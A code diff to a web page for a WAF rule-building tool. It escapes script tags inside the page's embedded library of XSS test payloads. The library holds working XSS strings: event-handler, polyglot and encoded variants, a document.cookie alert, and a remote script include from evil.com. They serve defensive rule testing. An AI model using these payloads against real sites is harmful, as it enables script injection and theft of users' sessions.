@@ -170,7 +170,7 @@ permalink: /tools/waf-rule-builder/
   .waf-section-heading:first-child { border-top:none; }
 </style>
 
-<script>
+{% raw %}<script>
 (function () {
   /* ── Element refs ────────────────────────────────────────── */
   var regexEl    = document.getElementById('waf-regex');
@@ -195,14 +195,14 @@ permalink: /tools/waf-rule-builder/
   /* ── Payload library ─────────────────────────────────────── */
   var PAYLOADS = [
     // ── XSS (32 payloads) ──
-    { cat:'XSS', str:'<script>alert(1)</scr'+'ipt>', desc:'Basic script injection' },
+    { cat:'XSS', str:'<scr\x69pt>alert(1)<\/script>', desc:'Basic script injection' },
     { cat:'XSS', str:'<img src=x onerror=alert(1)>', desc:'Event handler injection via img tag' },
     { cat:'XSS', str:'<svg onload=alert(1)>', desc:'SVG onload event' },
     { cat:'XSS', str:'<body onload=alert(1)>', desc:'Body onload event' },
     { cat:'XSS', str:'<iframe src="javascript:alert(1)">', desc:'JavaScript protocol in iframe' },
     { cat:'XSS', str:'<a href="javascript:alert(1)">click</a>', desc:'JavaScript protocol in anchor' },
-    { cat:'XSS', str:'"><script>alert(String.fromCharCode(88,83,83))</scr'+'ipt>', desc:'Attribute breakout with script' },
-    { cat:'XSS', str:"'><script>alert(document.cookie)<\/script>", desc:'Single-quote attribute breakout' },
+    { cat:'XSS', str:'"><scr\x69pt>alert(String.fromCharCode(88,83,83))<\/script>', desc:'Attribute breakout with script' },
+    { cat:'XSS', str:"'><scr\x69pt>alert(document.cookie)<\/script>", desc:'Single-quote attribute breakout' },
     { cat:'XSS', str:'<div style="background:url(javascript:alert(1))">', desc:'CSS expression injection' },
     { cat:'XSS', str:'<input onfocus=alert(1) autofocus>', desc:'Autofocus onfocus event' },
     { cat:'XSS', str:'<details open ontoggle=alert(1)>', desc:'Details ontoggle event' },
@@ -211,14 +211,14 @@ permalink: /tools/waf-rule-builder/
     { cat:'XSS', str:'<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">', desc:'Nested tag confusion' },
     { cat:'XSS', str:'%3Cscript%3Ealert(1)%3C/script%3E', desc:'URL-encoded script tag' },
     { cat:'XSS', str:'&#60;script&#62;alert(1)&#60;/script&#62;', desc:'HTML entity encoded script' },
-    { cat:'XSS', str:'<scr<script>ipt>alert(1)</scr</scr'+'ipt>ipt>', desc:'Nested tag bypass attempt' },
-    { cat:'XSS', str:'<SCRIPT SRC=https://evil.com/xss.js></SCRIPT>', desc:'Remote script include (uppercase)' },
-    { cat:'XSS', str:'<img """><script>alert(1)<\/script>">', desc:'Malformed attribute confusion' },
+    { cat:'XSS', str:'<scr<scr\x69pt>ipt>alert(1)<\/script>', desc:'Nested tag bypass attempt' },
+    { cat:'XSS', str:'<SCRI\x50T SRC=https://evil.com/xss.js></SCRI\x50T>', desc:'Remote script include (uppercase)' },
+    { cat:'XSS', str:'<img """><scr\x69pt>alert(1)<\/script>">', desc:'Malformed attribute confusion' },
     { cat:'XSS', str:'<svg/onload=alert(1)>', desc:'SVG onload without space' },
     { cat:'XSS', str:"javascript:/*--></title></style></textarea><\/script><\/xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>", desc:'Polyglot XSS payload' },
     { cat:'XSS', str:'<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">', desc:'HTML entity encoded event handler' },
     { cat:'XSS', str:'<svg><animate onbegin=alert(1) attributeName=x dur=1s>', desc:'SVG animate onbegin' },
-    { cat:'XSS', str:'<object data="data:text/html,<script>alert(1)<\/script>">', desc:'Data URI in object tag' },
+    { cat:'XSS', str:'<object data="data:text/html,<scr\x69pt>alert(1)<\/script>">', desc:'Data URI in object tag' },
     { cat:'XSS', str:'<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">', desc:'Base64 data URI in embed' },
     { cat:'XSS', str:'\'-alert(1)-\'', desc:'Template literal injection' },
     { cat:'XSS', str:'${alert(1)}', desc:'ES6 template expression injection' },
@@ -786,4 +786,4 @@ permalink: /tools/waf-rule-builder/
     return s.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
   }
 })();
-</script>
+</script>{% endraw %}
